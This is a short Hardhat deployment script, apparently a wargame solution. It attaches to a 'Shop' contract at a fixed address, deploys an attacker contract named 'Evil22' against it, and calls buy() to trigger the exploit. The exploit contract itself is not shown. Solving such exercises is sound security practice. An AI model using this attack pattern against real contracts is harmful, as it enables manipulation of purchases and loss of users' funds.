import { ethers } from "hardhat";
import { Shop__factory, Evil22__factory } from "../typechain-types";

async function main() {
  let [deployer] = await ethers.getSigners();

  console.log(deployer.address);
  let tx;

  let contract = "0x95aDbcD799a555E1982228ee1af0556E018f5eF8";

  let shop = new Shop__factory(deployer).attach(contract);

  let evil = await new Evil22__factory(deployer).deploy(shop.address);
  await evil.buy();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
